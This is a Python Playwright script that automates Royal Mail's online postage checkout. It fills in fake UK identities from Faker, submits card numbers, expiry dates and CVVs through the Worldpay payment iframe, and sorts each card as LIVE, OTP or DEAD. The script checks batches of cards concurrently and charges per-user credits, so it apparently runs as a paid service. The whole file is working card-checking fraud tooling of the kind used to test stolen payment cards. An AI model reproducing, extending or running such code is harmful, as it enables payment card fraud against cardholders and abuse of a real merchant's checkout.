from playwright.async_api import async_playwright
import asyncio

from database import get_email, change_credits, get_credits

from faker import Faker
faker = Faker("en_GB")

async def run_royalmailcharger(user_id: int, card_details: str):
    cardnumber, expirymonth, expiryyear, cvv = card_details.split('|')

    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True,
            args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
        )

        page = await browser.new_page()
        await page.set_viewport_size({"width": 1280, "height": 720})

        
        try:
            
            card_parts = card_details.strip().split("|")
            if len(card_parts) != 4:
                print(f"[Invalid card format]: {card_details}")
                return None, "INVALID"
    
            card_number, exp_month, exp_year, cvv = card_parts
            if len(exp_year) == 2:
                exp_year = "20" + exp_year

            exp_year_short = exp_year[-2:]
            

            # Fake details
            name = faker.name()
            address1 = faker.street_address()
            city = faker.city()
            postcode = faker.postcode()
            
            await page.goto("https://send.royalmail.com/send/youritem?country=GBR&format&weight=&weightUnit=G")

            await asyncio.sleep(1)  # small wait to ensure dynamic content loads fully

            email = await get_email(user_id)
            if not email:
                await change_credits(user_id, +1)
                return None, "NO_EMAIL"

            # Attempt to click Reject cookies
            try:
                await page.click("#consent_prompt_decline")  # 1 second max
            except Exception:
                pass  # button not found, ignore

            # Click Letter
            await page.click("#Letter")

            # Click Continue
            await page.locator("button[type='submit']").click()

            # Clicks show more
            try:
                await page.locator("button[data-testid='services-show-more-less-options']").click()
            except Exception:
                # Button not found, continue
                pass

            # Click Royal Mail 2nd Class
            await page.click("#OLP2")

            await asyncio.sleep(1)  # small wait to ensure dynamic content loads fully

            # Click Continue
            await page.locator("button[type='submit']").click()

            # Click enter manually
            await page.locator("button[data-testid='manual-entry']").click()

            # Fill details
            await page.fill ("#name-field", name)
            await page.fill("input[name='addressLine1']", address1)
            await page.fill("input[name='city']", city)
            await page.fill("input[name='postcode']", postcode)
            
            # Click Continue
            await page.locator("button[type='submit']").click()

            await asyncio.sleep(1)  # small wait to ensure dynamic content loads fully
            
            # Click enter manually
            await page.locator("button[data-testid='manual-entry']").click()

            # Fill details
            await page.fill ("#name-field", name)
            await page.fill("input[name='addressLine1']", address1)
            await page.fill("input[name='city']", city)
            await page.fill("input[name='postcode']", postcode)

            
            # Click Continue
            await page.locator("button[type='submit']").click()

            await asyncio.sleep(1)  # small wait to ensure dynamic content loads fully
            
            if await page.locator("#PB").count() > 0:
                await page.click("#PB")
            elif await page.locator("#other").count() > 0:
                await page.click("#other")
            else:
                print("Neither PB nor other found")

            # Click Continue
            await page.locator("button[type='submit']").click()
            
            await asyncio.sleep(1)  # small wait to ensure dynamic content loads fully

            await page.fill("input[name='purchaseEmail']", email)
            await page.locator('input[name="confirmWeight"]').check()
            await page.locator('input[name="confirmTerms"]').check()

            await page.locator('[data-testid="pay-with-credit-card"]').click()

            await asyncio.sleep(1)  # small wait to ensure dynamic content loads fully

            # Get the iframe
            frame = page.frame_locator("#wp-cl-worldpay-container-iframe")
            
            # Fill details inside the iframe
            await frame.locator("#cardNumber").fill(cardnumber)
            await frame.locator("input[name='cardholderName']").fill(name)
            await frame.locator("input[name='expiryDate.expiryMonth']").fill(exp_month)
            await frame.locator("input[name='expiryDate.expiryYear']").fill(exp_year_short)
            await frame.locator("input[name='securityCode']").fill(cvv)

            
            
            status = "Check Failed"
            for frame in page.frames:
                try:
                    content = await frame.content()
                    text = content.lower()
                    if "payment authorised" in text:
                        status = "LIVE"
                        break
                    elif any(w in text for w in ["verify", "otp", "authorise", "mobile app"]):
                        status = "OTP"
                        break
                    elif "declined" in text:
                        status = "DEAD"
                        break
                except Exception:
                    continue

            # Refund credit if status is unknown
            if status == "Check Failed":
                await change_credits(user_id, +1)

            

            screenshot_bytes = await page.screenshot(full_page=True)

            await browser.close()
            return status, screenshot_bytes

        except Exception as e:
            await browser.close()
            return f"Error: {e}", None


async def process_multiple_cards(user_id: int, cards: list[str]):
    # Create a list of tasks, each runs independently
    tasks = [run_royalmailcharger(user_id, card) for card in cards]

    # Run all tasks concurrently, gather results
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return results


# Usage example
if __name__ == "__main__":
    test_cards = [
        "1234567812345678|12|25|123",
        "8765432187654321|01|24|321",
        # more cards
    ]

    results = asyncio.run(process_multiple_cards(user_id, test_cards))
    for idx, (result, screenshot) in enumerate(results):
        print(f"Card {idx+1} result: {result}")
        # optionally save screenshots




















































